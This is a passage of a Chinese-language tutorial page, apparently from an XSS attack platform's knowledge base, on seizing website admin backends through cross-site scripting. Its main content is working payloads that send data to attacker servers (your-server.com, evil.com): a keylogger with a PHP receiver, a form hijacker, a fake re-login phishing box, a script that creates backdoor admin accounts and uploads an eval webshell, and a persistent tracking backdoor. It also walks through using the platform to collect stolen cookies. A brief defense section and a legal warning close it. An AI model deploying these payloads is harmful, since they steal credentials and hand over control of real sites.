                            <h4><i class="fas fa-check-circle"></i> Cookie窃取攻击总结</h4>
                            <p><strong>优点</strong>：</p>
                            <ul>
                                <li>简单直接，成功率高</li>
                                <li>不需要知道管理员密码</li>
                                <li>可以收集多种信息（localStorage、sessionStorage等）</li>
                            </ul>
                            <p><strong>缺点</strong>：</p>
                            <ul>
                                <li>HttpOnly Cookie无法直接窃取</li>
                                <li>Cookie可能有过期时间</li>
                                <li>某些网站绑定IP地址验证</li>
                                <li>需要外部服务器接收数据</li>
                            </ul>
                        </div>
                        
                        <h2 id="method2-password">4. 方法二：获取登录密码</h2>
                        
                        <p>如果Cookie窃取失败或Cookie设置了HttpOnly，可以尝试直接获取管理员的登录密码。</p>
                        
                        <h3 id="password-keylogger">4.1 键盘记录器方式</h3>
                        
                        <p>在管理员访问的页面中注入键盘记录脚本，记录所有键盘输入：</p>
                        
                        <div class="code-block">
                            <pre><code class="language-javascript">// 完整的键盘记录器XSS Payload
&lt;script&gt;
(function() {
    var keys = [];
    var server = 'http://your-server.com/keylog.php';
    
    // 监听键盘事件
    document.addEventListener('keydown', function(e) {
        var key = {
            key: e.key,
            code: e.code,
            time: new Date().toISOString(),
            url: window.location.href,
            target: e.target.tagName + (e.target.name ? '[name="' + e.target.name + '"]' : '')
        };
        
        keys.push(key);
        
        // 每10个按键或按下回车时发送
        if (keys.length >= 10 || e.key === 'Enter') {
            sendKeys();
        }
    });
    
    // 定时发送（每30秒）
    setInterval(sendKeys, 30000);
    
    // 页面卸载时发送
    window.addEventListener('beforeunload', sendKeys);
    
    function sendKeys() {
        if (keys.length === 0) return;
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', server, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            keys: keys,
            url: window.location.href,
            cookie: document.cookie
        }));
        
        keys = [];
    }
})();
&lt;/script&gt;</code></pre>
                        </div>
                        
                        <h4>服务器端接收代码（PHP）</h4>
                        
                        <div class="code-block">
                            <pre><code class="language-php">&lt;?php
// keylog.php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

$data = file_get_contents('php://input');
$json = json_decode($data, true);

$logFile = 'keylogs.txt';
$logData = sprintf(
    "[%s]\nURL: %s\nKeys: %s\n%s\n\n",
    date('Y-m-d H:i:s'),
    $json['url'] ?? '',
    json_encode($json['keys'] ?? [], JSON_PRETTY_PRINT),
    str_repeat('-', 80)
);

file_put_contents($logFile, $logData, FILE_APPEND);

echo json_encode(['status' => 'ok']);
?&gt;</code></pre>
                        </div>
                        
                        <h3 id="password-formhook">4.2 表单劫持方式</h3>
                        
                        <p>劫持登录表单的提交事件，在提交前窃取用户名和密码：</p>
                        
                        <div class="code-block">
                            <pre><code class="language-javascript">// 表单劫持XSS Payload
&lt;script&gt;
(function() {
    // 等待DOM加载完成
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', hookForms);
    } else {
        hookForms();
    }
    
    function hookForms() {
        // 劫持所有表单
        var forms = document.querySelectorAll('form');
        forms.forEach(function(form) {
            form.addEventListener('submit', function(e) {
                // 收集表单数据
                var formData = {};
                var inputs = form.querySelectorAll('input, textarea, select');
                
                inputs.forEach(function(input) {
                    if (input.name) {
                        formData[input.name] = input.value;
                    }
                });
                
                // 发送到攻击者服务器
                var xhr = new XMLHttpRequest();
                xhr.open('POST', 'http://your-server.com/formdata.php', true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify({
                    url: window.location.href,
                    action: form.action,
                    method: form.method,
                    data: formData,
                    timestamp: new Date().toISOString()
                }));
                
                // 不阻止表单正常提交，避免被发现
                // 如果想阻止提交，取消注释下一行
                // e.preventDefault();
            });
        });
        
        // 监听动态添加的表单
        var observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                mutation.addedNodes.forEach(function(node) {
                    if (node.tagName === 'FORM') {
                        hookForms();
                    }
                });
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }
})();
&lt;/script&gt;</code></pre>
                        </div>
                        
                        <h3 id="password-phishing">4.3 钓鱼页面方式</h3>
                        
                        <p>在页面中插入一个伪造的登录框，诱导管理员输入密码：</p>
                        
                        <div class="code-block">
                            <pre><code class="language-javascript">// 钓鱼登录框XSS Payload
&lt;script&gt;
(function() {
    // 创建遮罩层
    var overlay = document.createElement('div');
    overlay.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 999999; display: flex; align-items: center; justify-content: center;';
    
    // 创建登录框
    var loginBox = document.createElement('div');
    loginBox.style.cssText = 'background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3); max-width: 400px; width: 90%;';
    
    loginBox.innerHTML = '&lt;h2 style="color: #333; margin-bottom: 20px;"&gt;会话已过期&lt;/h2&gt;&lt;p style="color: #666; margin-bottom: 20px;"&gt;您的会话已过期，请重新登录&lt;/p&gt;&lt;form id="phishing-form"&gt;&lt;input type="text" id="username" placeholder="用户名" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px;"&gt;&lt;input type="password" id="password" placeholder="密码" style="width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 4px;"&gt;&lt;button type="submit" style="width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;"&gt;登录&lt;/button&gt;&lt;/form&gt;';
    
    overlay.appendChild(loginBox);
    document.body.appendChild(overlay);
    
    // 处理表单提交
    document.getElementById('phishing-form').addEventListener('submit', function(e) {
        e.preventDefault();
        
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        
        // 发送到攻击者服务器
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://your-server.com/phishing.php', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            username: username,
            password: password,
            url: window.location.href,
            cookie: document.cookie
        }));
        
        // 显示"登录中"，然后移除遮罩
        loginBox.innerHTML = '&lt;p style="text-align: center; color: #333;"&gt;登录中...&lt;/p&gt;';
        setTimeout(function() {
            overlay.remove();
        }, 1500);
    });
})();
&lt;/script&gt;</code></pre>
                        </div>
                        
                        <div style="background: rgba(0, 0, 0, 0.4); border: 2px solid var(--neon-green); border-radius: 8px; padding: 20px; margin: 1.5rem 0;">
                            <p style="text-align: center; color: var(--neon-green); margin-bottom: 15px;"><strong>钓鱼登录框效果示意图</strong></p>
                            <svg width="100%" height="350" viewBox="0 0 800 350" style="background: #1a1a1a; border-radius: 4px;">
                                <!-- 背景页面 -->
                                <rect x="0" y="0" width="800" height="350" fill="rgba(0,0,0,0.8)"/>
                                <!-- 页面内容模糊 -->
                                <text x="100" y="80" fill="#333" font-size="14" opacity="0.3">网站内容...</text>
                                <rect x="80" y="100" width="200" height="15" fill="#222" opacity="0.3" rx="2"/>
                                <rect x="80" y="125" width="150" height="15" fill="#222" opacity="0.3" rx="2"/>
                                <!-- 钓鱼登录框 -->
                                <rect x="250" y="80" width="300" height="220" fill="#fff" stroke="#00ff41" stroke-width="3" rx="8" filter="drop-shadow(0 10px 30px rgba(0,255,65,0.3))"/>
                                <!-- 标题 -->
                                <text x="400" y="115" fill="#333" font-size="18" font-weight="bold" text-anchor="middle">会话已过期</text>
                                <!-- 描述 -->
                                <text x="400" y="145" fill="#666" font-size="13" text-anchor="middle">您的会话已过期，请重新登录</text>
                                <!-- 用户名输入框 -->
                                <rect x="270" y="165" width="260" height="35" fill="#f5f5f5" stroke="#ddd" stroke-width="1" rx="4"/>
                                <text x="280" y="187" fill="#999" font-size="12">用户名</text>
                                <!-- 密码输入框 -->
                                <rect x="270" y="210" width="260" height="35" fill="#f5f5f5" stroke="#ddd" stroke-width="1" rx="4"/>
                                <text x="280" y="232" fill="#999" font-size="12">密码</text>
                                <!-- 登录按钮 -->
                                <rect x="270" y="255" width="260" height="35" fill="#007bff" rx="4" cursor="pointer"/>
                                <text x="400" y="278" fill="#fff" font-size="14" font-weight="bold" text-anchor="middle">登录</text>
                                <!-- 警告标志 -->
                                <circle cx="570" cy="95" r="20" fill="#ff4444"/>
                                <text x="570" y="103" fill="#fff" font-size="20" font-weight="bold" text-anchor="middle">!</text>
                                <!-- 说明文字 -->
                                <text x="400" y="330" fill="#ff4444" font-size="12" text-anchor="middle" font-weight="bold">← 假的登录框，用于窃取密码</text>
                            </svg>
                            <p style="text-align: center; color: var(--text-secondary); margin-top: 10px; font-size: 0.9rem;">半透明黑色遮罩 + 白色登录框居中显示<br>
                            "会话已过期，请重新登录"<br>
                            用户名输入框 + 密码输入框 + 登录按钮</p>
                        </div>
                        
                        <h2 id="method3-session">5. 方法三：会话劫持技术</h2>
                        
                        <p>即使无法获取Cookie，也可以直接在管理员的会话中执行操作：</p>
                        
                        <div class="code-block">
                            <pre><code class="language-javascript">// 会话劫持 - 直接创建新管理员账号
&lt;script&gt;
(function() {
    // 方法1: 使用fetch创建新管理员
    fetch('/admin/user/create', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: JSON.stringify({
            username: 'backdoor_admin',
            password: 'P@ssw0rd123!',
            email: 'backdoor@evil.com',
            role: 'administrator'
        }),
        credentials: 'include'  // 包含Cookie
    })
    .then(response => response.json())
    .then(data => {
        // 通知攻击者
        var img = new Image();
        img.src = 'http://your-server.com/notify.php?status=success&user=backdoor_admin';
    })
    .catch(error => {
        var img = new Image();
        img.src = 'http://your-server.com/notify.php?status=error&msg=' + encodeURIComponent(error);
    });
    
    // 方法2: 修改现有账号密码
    setTimeout(function() {
        fetch('/admin/user/1/password', {
            method: 'PUT',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                password: 'NewP@ssw0rd123!',
                password_confirmation: 'NewP@ssw0rd123!'
            }),
            credentials: 'include'
        });
    }, 2000);
    
    // 方法3: 上传Webshell
    setTimeout(function() {
        var formData = new FormData();
        var shellContent = '&lt;?php @eval($_POST["cmd"]); ?&gt;';
        var blob = new Blob([shellContent], {type: 'application/x-php'});
        formData.append('file', blob, 'config.php');
        
        fetch('/admin/file/upload', {
            method: 'POST',
            body: formData,
            credentials: 'include'
        });
    }, 4000);
})();
&lt;/script&gt;</code></pre>
                        </div>
                        
                        <div class="info-box">
                            <h4><i class="fas fa-lightbulb"></i> 会话劫持技巧</h4>
                            <ul>
                                <li>不需要窃取Cookie，直接在受害者浏览器中执行操作</li>
                                <li>可以绕过IP地址验证、设备指纹等限制</li>
                                <li>适合HttpOnly Cookie的场景</li>
                                <li>操作隐蔽，不易被发现</li>
                                <li>可以执行任何管理员权限的操作</li>
                            </ul>
                        </div>
                        
                        <h2 id="method4-backdoor">6. 方法四：植入后门脚本</h2>
                        
                        <p>如果XSS是存储型的，可以植入持久化后门，每次管理员访问都触发：</p>
                        
                        <div class="code-block">
                            <pre><code class="language-javascript">// 持久化后门脚本
&lt;script src="http://your-server.com/backdoor.js"&gt;&lt;/script&gt;

// backdoor.js 内容
(function() {
    // 检查是否在管理后台
    if (!window.location.pathname.startsWith('/admin')) {
        return;
    }
    
    // 收集后台信息
    var adminInfo = {
        url: window.location.href,
        cookie: document.cookie,
        localStorage: JSON.stringify(localStorage),
        username: document.querySelector('.admin-username')?.textContent,
        role: document.querySelector('.admin-role')?.textContent,
        timestamp: new Date().toISOString()
    };
    
    // 发送信息
    fetch('http://your-server.com/admin-tracker.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(adminInfo)
    });
    
    // 每次页面切换都发送
    var originalPushState = history.pushState;
    history.pushState = function() {
        originalPushState.apply(history, arguments);
        setTimeout(function() {
            fetch('http://your-server.com/admin-tracker.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    url: window.location.href,
                    action: 'navigation'
                })
            });
        }, 500);
    };
    
    // 监听管理员的所有操作
    document.addEventListener('click', function(e) {
        if (e.target.tagName === 'A' || e.target.closest('a')) {
            var link = e.target.closest('a');
            fetch('http://your-server.com/admin-tracker.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    action: 'click',
                    href: link.href,
                    text: link.textContent
                })
            });
        }
    });
})();</code></pre>
                        </div>
                        
                        <h2 id="platform-usage">7. 使用XSS平台进行攻击</h2>
                        
                        <p>使用专业的XSS平台（如蓝莲花XSS平台）可以大大简化攻击流程：</p>
                        
                        <h3>7.1 注册XSS平台账号</h3>
                        <p>访问 <a href="https://xss.li" style="color: var(--cyan);">https://xss.li</a> 注册账号并登录。</p>
                        
                        <h3>7.2 创建项目</h3>
                        <p><span class="step-number">1</span> 在平台中创建新项目，填写项目名称（如"目标网站后台渗透"）</p>
                        <p><span class="step-number">2</span> 选择模板：Cookie获取、键盘记录、截屏等</p>
                        <p><span class="step-number">3</span> 获取XSS代码</p>
                        
                        <div class="code-block">
                            <pre><code class="language-javascript">// 平台生成的XSS代码示例
&lt;script src="http://xss.li/xss.js?project=abc123"&gt;&lt;/script&gt;

// 或者使用短链接
&lt;script src="http://xss.li/a1b2c3"&gt;&lt;/script&gt;</code></pre>
                        </div>
                        
                        <h3>7.3 植入XSS代码</h3>
                        <p>将平台生成的代码插入到目标网站的XSS注入点。</p>
                        
                        <h3>7.4 查看日志</h3>
                        <p>在XSS平台的控制面板中实时查看：</p>
                        <ul>
                            <li>触发时间</li>
                            <li>IP地址和地理位置</li>
                            <li>浏览器信息</li>
                            <li>窃取的Cookie</li>
                            <li>键盘记录</li>
                            <li>页面截图</li>
                        </ul>
                        
                        <div style="background: rgba(0, 0, 0, 0.4); border: 2px solid var(--neon-green); border-radius: 8px; padding: 20px; margin: 1.5rem 0;">
                            <p style="text-align: center; color: var(--neon-green); margin-bottom: 15px;"><strong>XSS平台控制面板示意图</strong></p>
                            <svg width="100%" height="400" viewBox="0 0 900 400" style="background: #0a0a0a; border-radius: 4px;">
                                <!-- 整体布局 -->
                                <rect x="20" y="20" width="860" height="360" fill="#1a1a1a" stroke="#00ff41" stroke-width="2" rx="5"/>
                                <!-- 顶部导航栏 -->
                                <rect x="20" y="20" width="860" height="40" fill="#2a2a2a" rx="5" ry="0"/>
                                <text x="40" y="45" fill="#00ff41" font-size="16" font-weight="bold">蓝莲花XSS平台</text>
                                <circle cx="840" cy="40" r="12" fill="#00ff41"/>
                                <text x="840" y="45" fill="#000" font-size="14" font-weight="bold" text-anchor="middle">A</text>
                                <!-- 左侧项目列表 -->
                                <rect x="30" y="70" width="200" height="300" fill="#0a0a0a" stroke="#333" stroke-width="1"/>
                                <text x="40" y="90" fill="#00ff41" font-size="13" font-weight="bold">项目列表</text>
                                <rect x="40" y="100" width="180" height="35" fill="rgba(0,255,65,0.1)" stroke="#00ff41" stroke-width="1" rx="3"/>
                                <text x="50" y="115" fill="#00ff41" font-size="11">目标网站后台渗透</text>
                                <text x="50" y="128" fill="#888" font-size="9">6次触发</text>
                                <rect x="40" y="140" width="180" height="30" fill="#1a1a1a" rx="2"/>
                                <text x="50" y="158" fill="#ccc" font-size="10">Cookie获取测试</text>
                                <rect x="40" y="175" width="180" height="30" fill="#1a1a1a" rx="2"/>
                                <text x="50" y="193" fill="#ccc" font-size="10">键盘记录器测试</text>
                                <!-- 中间触发记录 -->
                                <rect x="240" y="70" width="360" height="300" fill="#0a0a0a" stroke="#333" stroke-width="1"/>
                                <text x="250" y="90" fill="#00ff41" font-size="13" font-weight="bold">触发记录</text>
                                <!-- 表头 -->
                                <rect x="245" y="95" width="350" height="25" fill="#1a1a1a"/>
                                <text x="255" y="110" fill="#0ff" font-size="10">时间</text>
                                <text x="355" y="110" fill="#0ff" font-size="10">IP地址</text>
                                <text x="485" y="110" fill="#0ff" font-size="10">浏览器</text>
                                <!-- 记录行 -->
                                <rect x="245" y="120" width="350" height="25" fill="rgba(0,255,65,0.05)" stroke="#00ff41" stroke-width="1"/>
                                <text x="255" y="135" fill="#00ff41" font-size="9">10:30:15</text>
                                <text x="355" y="135" fill="#ccc" font-size="9">192.168.1.100</text>
                                <text x="485" y="135" fill="#ccc" font-size="9">Chrome 120</text>
                                <rect x="245" y="145" width="350" height="25" fill="#0a0a0a"/>
                                <text x="255" y="160" fill="#888" font-size="9">10:31:42</text>
                                <text x="355" y="160" fill="#888" font-size="9">192.168.1.100</text>
                                <text x="485" y="160" fill="#888" font-size="9">Chrome 120</text>
                                <rect x="245" y="170" width="350" height="25" fill="#0a0a0a"/>
                                <text x="255" y="185" fill="#888" font-size="9">09:15:20</text>
                                <text x="355" y="185" fill="#888" font-size="9">10.0.0.50</text>
                                <text x="485" y="185" fill="#888" font-size="9">Firefox 115</text>
                                <!-- 右侧详细信息 -->
                                <rect x="610" y="70" width="260" height="300" fill="#0a0a0a" stroke="#333" stroke-width="1"/>
                                <text x="620" y="90" fill="#00ff41" font-size="13" font-weight="bold">详细信息</text>
                                <text x="620" y="115" fill="#0ff" font-size="10">Cookie:</text>
                                <rect x="620" y="120" width="240" height="45" fill="#1a1a1a" rx="2"/>
                                <text x="625" y="133" fill="#ccc" font-size="8" font-family="monospace">PHPSESSID=abc123...</text>
                                <text x="625" y="145" fill="#ccc" font-size="8" font-family="monospace">admin_token=eyJ...</text>
                                <text x="625" y="157" fill="#ccc" font-size="8" font-family="monospace">user_id=123456</text>
                                <text x="620" y="180" fill="#0ff" font-size="10">键盘记录:</text>
                                <rect x="620" y="185" width="240" height="35" fill="#1a1a1a" rx="2"/>
                                <text x="625" y="198" fill="#ccc" font-size="8" font-family="monospace">admin / P@ssw0rd...</text>
                                <text x="620" y="235" fill="#0ff" font-size="10">截图:</text>
                                <rect x="620" y="240" width="240" height="120" fill="#2a2a2a" stroke="#00ff41" stroke-width="1" rx="2"/>
                                <text x="740" y="305" fill="#00ff41" font-size="11" text-anchor="middle">页面截图</text>
                            </svg>
                            <p style="text-align: center; color: var(--text-secondary); margin-top: 10px; font-size: 0.9rem;">左侧：项目列表<br>
                            中间：触发记录列表（时间、IP、浏览器）<br>
                            右侧：详细信息（Cookie、键盘记录、截图）</p>
                        </div>
                        
                        <div class="success-box">
                            <h4><i class="fas fa-check-circle"></i> 使用XSS平台的优势</h4>
                            <ul>
                                <li>✅ 无需自己搭建服务器</li>
                                <li>✅ 提供可视化管理界面</li>
                                <li>✅ 自动分类和存储数据</li>
                                <li>✅ 支持多种攻击模板</li>
                                <li>✅ 实时通知功能</li>
                                <li>✅ 支持团队协作</li>
                                <li>✅ 数据加密存储</li>
                            </ul>
                        </div>
                        
                        <h2 id="defense">8. 防御措施</h2>
                        
                        <p>作为安全测试人员，也需要了解如何防御这些攻击：</p>
                        
                        <h3>8.1 输入验证与输出编码</h3>
                        <div class="code-block">
                            <pre><code class="language-php">// PHP示例：输出时进行HTML编码
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// JavaScript示例：使用textContent而非innerHTML
element.textContent = userInput;  // 安全
// element.innerHTML = userInput;  // 危险</code></pre>
                        </div>
                        
                        <h3>8.2 设置HttpOnly和Secure标志</h3>
                        <div class="code-block">
                            <pre><code class="language-php">// PHP设置Cookie时添加HttpOnly和Secure
setcookie(
    'session_id',
    $session_id,
    [
        'expires' => time() + 3600,
        'path' => '/',
        'domain' => '.example.com',
        'secure' => true,      // 仅HTTPS传输
        'httponly' => true,    // 禁止JavaScript访问
        'samesite' => 'Strict' // 防止CSRF
    ]
);</code></pre>
                        </div>
                        
                        <h3>8.3 配置内容安全策略（CSP）</h3>
                        <div class="code-block">
                            <pre><code class="language-markup">&lt;!-- 在HTML中设置CSP --&gt;
&lt;meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'nonce-random123'; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data: https:;"&gt;

&lt;!-- 或在HTTP响应头中设置 --&gt;
Content-Security-Policy: default-src 'self'; script-src 'self'</code></pre>
                        </div>
                        
                        <h3>8.4 使用WAF（Web应用防火墙）</h3>
                        <ul>
                            <li>ModSecurity</li>
                            <li>Cloudflare WAF</li>
                            <li>阿里云WAF</li>
                            <li>腾讯云WAF</li>
                        </ul>
                        
                        <h3>8.5 管理员安全意识培训</h3>
                        <div class="warning-box">
                            <h4><i class="fas fa-user-shield"></i> 管理员应该做到</h4>
                            <ul>
                                <li>不在后台长时间保持登录状态</li>
                                <li>定期清除浏览器Cookie</li>
                                <li>使用专用浏览器或隐私模式访问后台</li>
                                <li>不点击可疑链接</li>
                                <li>发现异常立即退出登录</li>
                                <li>启用双因素认证（2FA）</li>
                                <li>定期检查登录日志</li>
                            </ul>
                        </div>
                        
                        <h2 id="cases">9. 实战案例分析</h2>
                        
                        <h3>案例一：某论坛管理后台Cookie窃取</h3>
                        
                        <div class="attack-flow">
                            <h4>攻击过程</h4>
                            <div class="flow-step">
                                <strong>1. 发现漏洞</strong><br>
                                在论坛的用户签名功能中发现存储型XSS漏洞，允许HTML标签
                            </div>
                            <div class="flow-step">
                                <strong>2. 植入代码</strong><br>
                                修改个人签名为：&lt;script src="http://evil.com/xss.js"&gt;&lt;/script&gt;
                            </div>
                            <div class="flow-step">
                                <strong>3. 发帖引流</strong><br>
                                在论坛发布热门话题帖，吸引管理员查看（管理员会看到签名）
                            </div>
                            <div class="flow-step">
                                <strong>4. 获取Cookie</strong><br>
                                管理员查看帖子时，XSS触发，Cookie被发送到攻击者服务器
                            </div>
                            <div class="flow-step">
                                <strong>5. 登录后台</strong><br>
                                使用窃取的Cookie成功登录论坛管理后台
                            </div>
                        </div>
                        
                        <p><strong>关键点</strong>：</p>
                        <ul>
                            <li>签名在所有帖子中都会显示，增加触发概率</li>
                            <li>管理员经常查看论坛内容，触发XSS的可能性很高</li>
                            <li>该论坛Cookie未设置HttpOnly，可以直接读取</li>
                        </ul>
                        
                        <h3>案例二：客服系统表单劫持</h3>
                        
                        <div class="attack-flow">
                            <h4>攻击过程</h4>
                            <div class="flow-step">
                                <strong>1. 提交工单</strong><br>
                                在客服系统提交工单，内容包含表单劫持XSS代码
                            </div>
                            <div class="flow-step">
                                <strong>2. 客服查看</strong><br>
                                客服人员在后台查看工单时，XSS代码注入到页面
                            </div>
                            <div class="flow-step">
                                <strong>3. 密码窃取</strong><br>
                                表单劫持脚本记录客服/管理员在系统内的所有操作，包括密码修改等
                            </div>
                            <div class="flow-step">
                                <strong>4. 获取凭证</strong><br>
                                攻击者服务器接收到管理员账号和密码
                            </div>
                            <div class="flow-step">
                                <strong>5. 后台登录</strong><br>
                                使用获取的账号密码直接登录管理后台
                            </div>
                        </div>
                        
                        <h3>案例三：会话劫持创建后门账号</h3>
                        
                        <p><strong>攻击场景</strong>：某电商网站的商品评论功能</p>
                        
                        <p><strong>攻击步骤</strong>：</p>
                        <ol>
                            <li>购买商品后，在评论中插入会话劫持XSS代码</li>
                            <li>管理员审核评论时，XSS代码自动执行</li>
                            <li>脚本在管理员会话中创建新的管理员账号</li>
                            <li>攻击者使用新创建的账号登录后台</li>
                            <li>即使原管理员退出登录，新账号仍然有效</li>
                        </ol>
                        
                        <div class="code-block">
                            <pre><code class="language-javascript">// 评论中插入的XSS代码
商品很好！推荐购买！
&lt;img src=x onerror="
fetch('/admin/api/user/create',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
        username:'system_backup',
        password:'B@ckup2025!',
        email:'backup@system.local',
        role:'superadmin'
    }),
    credentials:'include'
}).then(()=>{
    new Image().src='http://evil.com/success.php?user=system_backup'
})
"&gt;</code></pre>
                        </div>
                        
                        <p><strong>防御改进</strong>：</p>
                        <ul>
                            <li>评论内容严格过滤HTML标签</li>
                            <li>创建管理员需要额外验证（邮件确认、2FA）</li>
                            <li>记录所有管理员创建操作的日志</li>
                            <li>实施CSP策略阻止外部资源加载</li>
                        </ul>
                        
                        <div class="success-box">
                            <h4><i class="fas fa-graduation-cap"></i> 学习总结</h4>
                            <p>通过本教程，你已经掌握了：</p>
                            <ul>
                                <li>✅ XSS后台登录攻击的4种主要方法</li>
                                <li>✅ Cookie窃取的完整流程和代码实现</li>
                                <li>✅ 密码获取的3种技术（键盘记录、表单劫持、钓鱼）</li>
                                <li>✅ 会话劫持和后门植入技术</li>
                                <li>✅ 使用XSS平台简化攻击流程</li>
                                <li>✅ 完整的防御措施和最佳实践</li>
                                <li>✅ 真实案例的攻击思路分析</li>
                            </ul>
                            <p><strong>重要提醒</strong>：请务必在合法授权的环境中练习这些技术！</p>
                        </div>
                        
                        <div class="danger-box">
                            <h4><i class="fas fa-balance-scale"></i> 法律责任</h4>
                            <p>根据《中华人民共和国网络安全法》、《刑法》等相关法律规定：</p>
                            <ul>
                                <li>未经授权访问计算机信息系统，最高可判处<strong>三年以上有期徒刑</strong></li>
                                <li>窃取、破坏数据造成严重后果的，最高可判处<strong>七年以上有期徒刑</strong></li>
                                <li>提供黑客工具、技术支持的，同样承担法律责任</li>
                            </ul>
                            <p>请遵守法律，合理使用安全技术！</p>
                        </div>
                    </div>
                    
                    <!-- Article Navigation -->
                    <div class="article-navigation" style="display: flex; justify-content: space-between; margin-top: 3rem; padding-top: 2rem; border-top: 1px solid var(--border-color);">
                        <a href="cookie-login-guide.html" style="color: var(--neon-green); text-decoration: none;">
                            <i class="fas fa-arrow-left"></i> 上一篇：使用Cookie登录网站
                        </a>
                        <a href="../wiki.html" style="color: var(--neon-green); text-decoration: none;">
                            返回知识库 <i class="fas fa-arrow-right"></i>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Footer -->
    <footer class="footer">
        <div class="container-fluid">
            <div class="footer-content">
                <div class="footer-copyright">
                    <span>© 2025 蓝莲花XSS在线平台</span>
                    <span class="text-tertiary">|</span>
                    <span class="text-secondary">v2.0.8</span>
                </div>
                <div class="footer-links">
                    <a href="../index.html"><i class="fas fa-home"></i> 返回首页</a>
                    <a href="../login.php"><i class="fas fa-sign-in-alt"></i> 登录平台</a>
                </div>
            </div>
        </div>
    </footer>
    
    <!-- 回到顶部按钮 -->
    <button class="back-to-top" id="backToTop">
        <i class="fas fa-arrow-up"></i>
    </button>
    
    <script src="../static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="../static/libs/prism/js/prism.min.js"></script>
    <script src="../static/libs/prism/js/prism-javascript.min.js"></script>
    <script src="../static/libs/prism/js/prism-markup.min.js"></script>
    <script src="../static/libs/prism/js/prism-php.min.js"></script>
    <script>
        // 回到顶部功能
        const backToTopBtn = document.getElementById('backToTop');
        window.addEventListener('scroll', function() {
            if (window.pageYOffset > 300) {
                backToTopBtn.classList.add('show');
            } else {
                backToTopBtn.classList.remove('show');
            }
        });
        backToTopBtn.addEventListener('click', function() {
            window.scrollTo({ top: 0, behavior: 'smooth' });
        });
    </script>
</body>
</html>
